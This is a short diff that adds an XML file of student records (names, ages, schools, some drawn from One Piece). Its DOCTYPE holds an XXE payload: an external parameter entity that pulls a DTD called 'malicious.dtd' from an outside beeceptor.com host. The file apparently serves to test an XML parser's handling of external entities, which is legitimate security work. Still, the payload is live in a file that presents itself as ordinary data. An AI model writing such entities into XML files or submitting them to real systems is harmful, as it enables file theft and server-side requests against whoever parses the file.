@@ -1,0 +1,21 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 
+"https://patida.free.beeceptor.com/malicious.dtd"> %xxe;]>
+<students>
+  <student>
+    <name>Pham Thi Dan</name>    
+    <age>20</age>
+    <school>UET</school>
+  </student>
+  <student>
+    <name>Monkey D.Luffy</name>
+    <age>21</age>
+    <school>East Blue</school>
+  </student>
+  <student>
+    <name>Boa Hancock</name>
+    <age>33</age>
+    <school>Amazon Lily</school>
+  </student>
+  
+</students>
